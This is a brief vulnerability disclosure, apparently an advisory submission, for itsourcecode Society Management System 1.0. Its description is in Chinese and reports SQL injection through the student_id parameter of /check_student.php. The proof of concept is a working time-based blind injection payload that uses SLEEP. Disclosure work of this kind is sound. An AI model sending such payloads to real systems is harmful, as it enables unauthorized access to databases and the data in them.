# Vendor

itsourcecode

# Product

Society Management System

# version

1.0

Download Source Code: https://itsourcecode.com/wp-content/uploads/2021/04/Society-Management-System-Project-In-PHP-Free-Download-Source-Code.zip

# Description

在/check_student.php页面存在SQL注入漏洞，这是由于student_id参数没有经过任何过滤。

# Poc
```
Parameter: student_id (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: student_id=12345678' AND (SELECT 2119 FROM (SELECT(SLEEP(5)))fURM) AND 'Njoa'='Njoa
```
